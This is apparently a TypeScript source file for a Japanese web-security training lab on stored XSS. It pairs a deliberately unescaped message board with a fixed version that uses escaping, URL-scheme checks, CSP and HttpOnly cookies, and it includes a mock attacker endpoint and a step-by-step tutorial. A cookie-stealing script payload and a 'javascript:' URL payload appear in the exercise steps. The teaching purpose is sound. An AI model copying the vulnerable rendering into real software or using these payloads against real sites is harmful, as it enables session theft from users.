import { Hono } from "hono";
import type { Context } from "hono";
import { setCookie } from "hono/cookie";
import type { AppEnv, LabDb } from "../env";
import { escapeHtml, exercisePage, table } from "../lab/html";
import type { Exercise } from "../lab/types";

/**
 * 格納型XSS: 一言メモ掲示板。
 * 反射型との違いは「入力が保存され、あとでページを開いた全員に効く」こと。罠のURLは要らない。
 *
 * 脆弱版と修正版は同じ表（xss_stored_posts）を `mode` 列で分けて使う。
 * 保存するデータは両方とも生のまま。違いは「出力のしかた」と「URLの検証」だけにしてある。
 */

const ID = "xss-stored";
type Mode = "vuln" | "fixed";

interface Post {
  id: number;
  name: string;
  comment: string;
  website: string;
  created_at: string;
}

interface PostValues {
  name: string;
  comment: string;
  website: string;
}

/** 掲示板の投稿を新しい順に読む（保存したままの生の値） */
function loadPosts(db: LabDb, mode: Mode): Promise<Post[]> {
  return db.all<Post>(
    "SELECT id, name, comment, website, created_at FROM xss_stored_posts WHERE mode = ? ORDER BY id DESC LIMIT 30",
    [mode],
  );
}

/** フォームの値を読む。長さの上限を切るだけで、中身の加工はしない */
async function readPostForm(c: Context<AppEnv>): Promise<PostValues> {
  const f = await c.req.parseBody();
  const take = (key: string, max: number) => String(f[key] ?? "").trim().slice(0, max);
  return { name: take("name", 40) || "名無し", comment: take("comment", 500), website: take("website", 200) };
}

/** 掲示板の画面（脆弱版・修正版で共通の外枠）。items は各版が組み立てた投稿一覧のHTML */
function boardPage(mode: Mode, items: string, error = "", values: PostValues = { name: "", comment: "", website: "" }) {
  const form = `<form method="post" action="/x/${ID}/${mode}/post">
<label for="name">名前</label>
<input id="name" name="name" maxlength="40" value="${escapeHtml(values.name)}">
<label for="comment">コメント</label>
<textarea id="comment" name="comment" rows="3" cols="50" maxlength="500">${escapeHtml(values.comment)}</textarea>
<label for="website">ウェブサイト（任意）</label>
<input id="website" name="website" maxlength="200" placeholder="https://example.com/" value="${escapeHtml(values.website)}">
<p><button>投稿する</button></p>
</form>`;
  const clear = `<form method="post" action="/x/${ID}/${mode}/clear"><button class="ghost">掲示板を空にする</button></form>`;
  const body = `<h1>一言メモ掲示板</h1>
<p>ひとことメモを残す掲示板です。投稿はこの掲示板を開いた人全員に表示されます。</p>
${error}${form}
<h2>投稿一覧</h2>
${items || "<p>まだ投稿がありません。</p>"}
${clear}`;
  return exercisePage({ id: ID, mode, title: "一言メモ掲示板", body });
}

//#region vuln
const vuln = new Hono<AppEnv>();

async function renderVulnBoard(db: LabDb): Promise<string> {
  const posts = await loadPosts(db, "vuln");
  const items = posts
    .map((p) => {
      const who = `<strong>${p.name}</strong>`; // [!] 名前をエスケープせずHTMLに出力している
      const text = `<p>${p.comment}</p>`; // [!] コメントをエスケープせず本文に出力。<script> がそのまま動く
      const site = p.website ? ` <a href="${p.website}">ウェブサイト</a>` : ""; // [!] URLの種類を確かめずhrefに出力。javascript: も通る
      return `<div class="result">${who}${site} <small>${escapeHtml(p.created_at)}</small>${text}</div>`;
    })
    .join("");
  return boardPage("vuln", items);
}

vuln.get("/", async (c) => {
  // 学習用のダミーCookie。JavaScriptから読める（HttpOnlyなし）ので、XSSで盗めることを体験できる
  setCookie(c, "demo_secret", "SESSION-DEMO-1234", { path: "/" });
  return c.html(await renderVulnBoard(c.var.db));
});

vuln.post("/post", async (c) => {
  const f = await readPostForm(c);
  if (f.comment === "") return c.redirect(`/x/${ID}/vuln/`, 303);
  // 保存するだけなら、生のままでも問題はない（SQL は ? で値を渡しているのでSQLインジェクションにもならない）。
  // 危険なのは、この値をあとで画面に出す側が何も処理していないこと
  await c.var.db.run("INSERT INTO xss_stored_posts (mode, name, comment, website) VALUES (?, ?, ?, ?)", [
    "vuln",
    f.name,
    f.comment,
    f.website,
  ]);
  return c.redirect(`/x/${ID}/vuln/`, 303);
});
//#endregion

//#region fixed
const fixed = new Hono<AppEnv>();

// 多層防御: インラインスクリプトを実行させないCSP（エスケープ漏れが将来入っても被害を止める保険）
fixed.use("*", async (c, next) => {
  await next();
  c.res.headers.set(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'",
  );
});

// ウェブサイト欄の検証: http / https の絶対URLだけを通す（javascript: や data: は弾く）
function isHttpUrl(value: string): boolean {
  try {
    const u = new URL(value);
    return u.protocol === "http:" || u.protocol === "https:";
  } catch {
    return false;
  }
}

async function renderFixedBoard(db: LabDb, error = "", values?: PostValues): Promise<string> {
  const posts = await loadPosts(db, "fixed");
  const items = posts
    .map((p) => {
      const who = `<strong>${escapeHtml(p.name)}</strong>`;
      const text = `<p>${escapeHtml(p.comment)}</p>`;
      const href = escapeHtml(p.website);
      const site = isHttpUrl(p.website) ? ` <a href="${href}" target="_blank" rel="noopener nofollow">ウェブサイト</a>` : "";
      return `<div class="result">${who}${site} <small>${escapeHtml(p.created_at)}</small>${text}</div>`;
    })
    .join("");
  return boardPage("fixed", items, error, values);
}

fixed.get("/", async (c) => {
  // HttpOnly を付けると JavaScript から読めなくなり、XSS で盗まれにくくなる
  setCookie(c, "demo_secret", "SESSION-DEMO-1234", { path: "/", httpOnly: true, sameSite: "Lax" });
  return c.html(await renderFixedBoard(c.var.db));
});

fixed.post("/post", async (c) => {
  const f = await readPostForm(c);
  if (f.comment === "") return c.redirect(`/x/${ID}/fixed/`, 303);
  if (f.website !== "" && !isHttpUrl(f.website)) {
    const error = `<p class="ng">ウェブサイトは http:// か https:// で始まるURLだけ登録できます。この投稿は保存していません。</p>`;
    return c.html(await renderFixedBoard(c.var.db, error, f), 400);
  }
  // 保存は生のまま。エスケープは「画面に出すとき」に行う（保存時にエスケープしない理由は解説を参照）
  await c.var.db.run("INSERT INTO xss_stored_posts (mode, name, comment, website) VALUES (?, ?, ?, ?)", [
    "fixed",
    f.name,
    f.comment,
    f.website,
  ]);
  return c.redirect(`/x/${ID}/fixed/`, 303);
});
//#endregion

// 「掲示板を空にする」は、版ごとの投稿だけを消す（脆弱版と修正版で共通）
for (const [app, mode] of [
  [vuln, "vuln"],
  [fixed, "fixed"],
] as const) {
  app.post("/clear", async (c) => {
    await c.var.db.run("DELETE FROM xss_stored_posts WHERE mode = ?", [mode]);
    return c.redirect(`/x/${ID}/${mode}/`, 303);
  });
}

// ---- 攻撃者サイト役（/attacker/xss-stored）: 盗まれた情報の受け口。罠のリンクは要らない ----
const PAYLOAD =
  "<script>new Image().src='/attacker/xss-stored/collect?c='+encodeURIComponent(document.cookie)</script>";

const attacker = new Hono<AppEnv>();

attacker.get("/collect", async (c) => {
  const data = (c.req.query("c") ?? "").slice(0, 500);
  await c.var.db.run("INSERT INTO xss_stored_stolen (data) VALUES (?)", [data]);
  return c.body(null, 204);
});

attacker.post("/clear", async (c) => {
  await c.var.db.run("DELETE FROM xss_stored_stolen");
  return c.redirect(`/attacker/${ID}/`, 303);
});

attacker.get("/", async (c) => {
  const stolen = await c.var.db.all("SELECT id, data FROM xss_stored_stolen ORDER BY id DESC LIMIT 20");

  const html = `<!doctype html><html lang="ja"><head><meta charset="utf-8"><meta name="robots" content="noindex">
<title>攻撃者サイト（模擬）</title><link rel="stylesheet" href="/assets/lab.css"></head>
<body class="ex ex--guard"><main class="ex-main">
<div class="notice notice--warn">これは<strong>攻撃者側</strong>を演じる模擬ページです。実際には外部へ何も送られず、すべてこのラボの中だけで完結します。</div>
<h1>① 攻撃者は掲示板に書き込むだけ</h1>
<p>攻撃者は、次のスクリプトをコメント欄に貼って投稿します。<strong>罠のリンクをばらまく必要はありません。</strong>投稿が保存された時点で、仕込みは完了です。</p>
<pre class="code"><code>${escapeHtml(PAYLOAD)}</code></pre>
<p><a href="/x/${ID}/vuln/">脆弱版の掲示板を開く（ここに貼って投稿）</a></p>
<h1>② 掲示板を開いた人が、全員被害者になる</h1>
<p>あとから掲示板を開いた人（ふつうの利用者や、管理者）のブラウザで、保存されたスクリプトが動きます。開く人が増えるほど、次の③に記録が増えます。</p>
<p>この演習ではあなた一人で攻撃者と被害者の両方を演じます。投稿したあと、<a href="/x/${ID}/vuln/">掲示板をもう一度開く</a>（再読み込みする）たびに、被害者が 1 人増えたと考えてください。</p>
<h1>③ 攻撃者のサーバーに届いた情報（模擬）</h1>
${stolen.length ? table(["#", "届いたCookie"], stolen.map((r) => [r.id, r.data])) : "<p>まだ何も届いていません。</p>"}
<form method="post" action="/attacker/${ID}/clear"><button class="ghost">ログを消す</button></form>
<p><a href="/x/${ID}">← 解説へ戻る</a></p>
</main></body></html>`;
  return c.html(html);
});

export const exercise: Exercise = {
  id: ID,
  title: "格納型XSS",
  summary: "投稿が保存され、あとでその掲示板を開いた全員のブラウザでスクリプトが動く。罠のリンクは要らない。",
  level: 1,
  book: { chapter: 4, topic: "表示処理に伴う問題（XSS）" },
  schema: [
    `CREATE TABLE xss_stored_posts (
       id INTEGER PRIMARY KEY AUTOINCREMENT,
       mode TEXT NOT NULL,
       name TEXT NOT NULL,
       comment TEXT NOT NULL,
       website TEXT NOT NULL DEFAULT '',
       created_at TEXT NOT NULL DEFAULT (datetime('now'))
     )`,
    `CREATE TABLE xss_stored_stolen (id INTEGER PRIMARY KEY AUTOINCREMENT, data TEXT NOT NULL)`,
  ],
  seed: [
    `INSERT INTO xss_stored_posts (mode, name, comment, website) VALUES ('vuln', 'はなこ', 'はじめまして。よろしくお願いします。', 'https://hanako.example/')`,
    `INSERT INTO xss_stored_posts (mode, name, comment, website) VALUES ('fixed', 'はなこ', 'はじめまして。よろしくお願いします。', 'https://hanako.example/')`,
  ],
  vuln,
  fixed,
  attacker,
  doc: {
    goals: [
      "格納型XSSが、反射型と違って「罠のリンクなしで、ページを開いた全員に」効く理由を説明できる",
      "本文に出す場合とURL（href）に出す場合とで、必要な対策が違うことを説明できる",
      "「保存時ではなく出力時にエスケープする」方針の理由を説明できる",
    ],
    background: `
格納型XSSは、攻撃者が送り込んだ文字列がデータベースなどに**保存**され、それを表示するページにそのまま出力されることで起きます。掲示板、コメント欄、プロフィール、問い合わせの管理画面など、「誰かが入力した内容を、別の誰かが見る」機能が舞台です。

反射型XSSとの違いは、次の3点です。

- 反射型は、スクリプトを仕込んだURLを被害者に踏ませる必要があります。格納型は、**罠のリンクが要りません**。被害者はふだんどおりページを開くだけです。
- 反射型は、リンクを踏んだ人にだけ効きます。格納型は、**保存された時点から、あとでそのページを見た人すべて**に効きます。
- 攻撃者は投稿を 1 回するだけで、あとは被害者が増えるのを待てます。管理者が画面を開けば、管理者の権限で操作されるおそれもあります。

被害者のブラウザは、スクリプトを正規サイトが出したものとして実行します。Cookieの読み取り、画面の書き換え、ログイン中の利用者になりすました操作が、反射型と同じようにできてしまいます。
`,
    steps: [
      {
        title: "ふつうに投稿する",
        body: "脆弱版の掲示板で、名前・コメント・ウェブサイトを入れて投稿します。ウェブサイトは `https://example.com/` のようなURLで構いません。投稿が一覧に出て、ウェブサイトは「ウェブサイト」というリンクになります。",
        payloads: [{ label: "ウェブサイト", value: "https://example.com/" }],
        open: { label: "脆弱版の掲示板を開く", href: "vuln/" },
      },
      {
        title: "入力がHTMLとして解釈されることを確かめる",
        body: "コメントにHTMLタグを入れて投稿します。太字や下線で表示されれば、入力値がエスケープされずHTMLとして出力されている証拠です。ページを再読み込みしても、保存されたタグがまた効きます。",
        payloads: [{ label: "コメント", value: "<b>太字</b><u>下線</u>" }],
        open: { label: "脆弱版の掲示板を開く", href: "vuln/" },
      },
      {
        title: "scriptでCookieを盗む",
        body: "コメントにスクリプトを入れて投稿します。このスクリプトは、ダミーCookie `demo_secret` を攻撃者サイト（模擬）の受け口へ送ります。投稿した直後から、**この掲示板を開くたびに**スクリプトが動きます。画面に何も出ないので、動いたことは次の手順で確かめます。",
        payloads: [
          {
            label: "コメント",
            value: PAYLOAD,
            note: "同じオリジンの受け口へ送る。脆弱版のガードCSPは同一オリジンへの送信を許す",
          },
        ],
        open: { label: "脆弱版の掲示板を開く", href: "vuln/" },
      },
      {
        title: "ウェブサイト欄から javascript: URL を動かす",
        body: "今度は、コメントは普通の文章にして、**ウェブサイト欄**に `javascript:` で始まる値を入れます。投稿後、表示された「ウェブサイト」のリンクをクリックすると、スクリプトが動きます。この欄は本文ではなくURLなので、`<` や `>` を入れなくても攻撃できます。",
        payloads: [{ label: "ウェブサイト", value: "javascript:alert(document.cookie)" }],
        open: { label: "脆弱版の掲示板を開く", href: "vuln/" },
      },
      {
        title: "攻撃者のログを見る（被害者は掲示板を開くだけ）",
        body: "攻撃者サイト（模擬）を開き、届いたCookieの一覧を見ます。掲示板を何度か開き直してから、また攻撃者サイトを見ると、記録が増えています。罠のリンクを一度も使っていないのに、掲示板を開いた人のCookieが集まっています。確かめ終えたら、脆弱版の掲示板で「掲示板を空にする」を押してください（押さないと、開くたびにスクリプトが動き続けます）。",
        open: { label: "攻撃者サイト（模擬）を開く", href: "/attacker/xss-stored/" },
      },
    ],
    cause: `
原因は、**保存されていたデータを画面に出すとき、エスケープも検証もしていないこと**です。ハイライトした3行が問題です。

- 1行目（名前）: HTMLの本文にそのまま出力しています。
- 2行目（コメント）: 同じく本文にそのまま出力しているので、\`<script>\` がタグとして解釈されます。
- 3行目（ウェブサイト）: URLとして使えるかを確かめずに \`href\` に入れています。\`javascript:\` で始まる値でも、リンクをクリックするとスクリプトが動きます。

保存の処理自体（\`INSERT\`）は、値を \`?\` で渡しているのでSQLインジェクションにはなりません。保存するだけなら、データが生のままでも問題はありません。**危険になるのは、そのデータを HTML に出すとき**です。データを書き込んだ人と、見る人が別なので、「自分の入力ではないから安全」という思い込みも生まれやすい場所です。
`,
    fix: `
修正の本命は、**HTMLに出力するときに、場所に合わせてエスケープすること**です。名前とコメントは \`escapeHtml\` を通して文字参照（\`&lt;\` など）に置き換えます。

ただし、ウェブサイト欄は**エスケープだけでは防げません**。\`javascript:alert(1)\` には \`<\` も \`"\` も含まれないので、エスケープしても何も変わらず、リンクをクリックすれば動きます。そこで、保存するときにURLを \`new URL()\` で解析し、\`http:\` か \`https:\` のときだけ受け付けます（不正なら保存せず、エラーを出します）。表示するときも、同じ確認をもう一度します。過去に保存されたデータや、別の経路で入ったデータが混ざっていても、リンクにならないようにするためです。リンクには \`rel="noopener nofollow"\` を付け、開いた先のページから元のページを操作されないようにし、検索エンジンへの評価が渡らないようにしています。

**保存するときにエスケープしない理由**も押さえてください。

- どの文字が危険かは、出力先で変わります（HTMLの本文、属性値、JavaScript、CSV、メールなど）。保存時に1つの方式でエスケープしても、別の出力先では足りなかったり、余計だったりします。
- 保存時にエスケープすると、元の文字が失われ、二重にエスケープされる事故も起きます。
- 出力するコードで必ずエスケープする決まりにしておけば、「どこで漏れたか」を探す場所が出力の箇所だけになります。

あわせて、エスケープ漏れが将来入っても被害を抑える保険を2つ入れています。

- \`Content-Security-Policy\` で、インラインスクリプトの実行を許可しない
- Cookieに \`HttpOnly\` を付け、JavaScriptから読めなくする
`,
    verify: [
      "修正版の掲示板で、手順2〜3のコメントをそのまま投稿する。タグが文字として表示され、攻撃者サイトに記録が増えない",
      "修正版で、ウェブサイト欄に `javascript:alert(document.cookie)` を入れて投稿する。エラーが表示され、投稿は保存されない",
      "ウェブサイト欄に `https://example.com/` を入れて投稿する。リンクが表示され、`rel=\"noopener nofollow\"` が付いている（開発者ツールで確認）",
      "「ページのソースを表示」で、コメントが `&lt;script&gt;` のようにエスケープされていることを確かめる",
      "開発者ツールのコンソールで `document.cookie` を実行する。修正版では `demo_secret` が見えない（HttpOnly）",
    ],
    beyond: `
**「入力時に危険な文字を弾けば十分」ではありません。** 名前に \`O'Reilly\` のような正当な \`'\` が入ることもあり、入力時の除去ではデータが壊れます。それに、入力経路が増える（API、CSV取り込み、別システムとの連携）と、すべてに同じ検査を入れ忘れずに維持するのは困難です。出力時のエスケープなら、画面に出す箇所だけを見れば足ります。ウェブサイト欄のような「値の種類を限る」検証は、入力時にも行います。これはエスケープの代わりではなく、業務上の入力チェックを兼ねた追加の防御です。

**管理画面や、内部向けの画面でも同じです。** 一般の利用者の投稿を管理者が見る画面は、権限の強い人のブラウザでスクリプトが動くので、被害が大きくなります。「社内の人しか見ないから」と、エスケープを省かないでください。

**HTMLをそのまま書かせたい機能は、別の設計が必要です。** 自作の正規表現で \`<script>\` を除くやり方は、バイパスされがちです。許可するタグと属性を決めて、実績のあるサニタイズ用ライブラリで処理し、それでもCSPを併用します。

**HttpOnlyとCSPは保険です。** HttpOnlyはCookieの読み取りしか防ぎません。スクリプトが動けば、画面の書き換えや、ログイン中の利用者としての操作は引き続き可能です。同じ原因（出力時のエスケープ漏れ）が、反射型XSSの演習でも出てきます。ブラウザ側のJavaScriptが原因になる型は、DOM Based XSSの演習で扱います。
`,
    quiz: [
      {
        q: "修正版は、コメントに `<script>` が入った投稿をそのまま保存しています。それでも安全なのはなぜ？",
        a: "保存は生のままで、**画面に出すときにエスケープ**しているからです。ブラウザには `&lt;script&gt;` と届くので、タグではなく文字として表示されます。保存データにタグが含まれること自体は、問題ではありません。",
      },
      {
        q: "ウェブサイト欄の値を `escapeHtml` で処理して `href` に入れるだけでは、なぜ `javascript:alert(1)` を防げない？",
        a: "`javascript:alert(1)` には、エスケープの対象になる `& < > \" '` が含まれないので、処理しても値が変わらないからです。リンクをクリックするとスクリプトが動きます。`href` に入れる値は、スキームが `http:` か `https:` かを確認する（許可リスト）必要があります。",
      },
      {
        q: "投稿を見るのが管理者だけの画面なら、投稿内容のエスケープは省いてよい？",
        a: "省いてはいけません。管理者のブラウザでスクリプトが動けば、管理者の権限で設定変更や情報の取得ができてしまうので、被害はむしろ大きくなります。利用者が誰であっても、出力時にエスケープするのが基本です。",
      },
    ],
  },
};
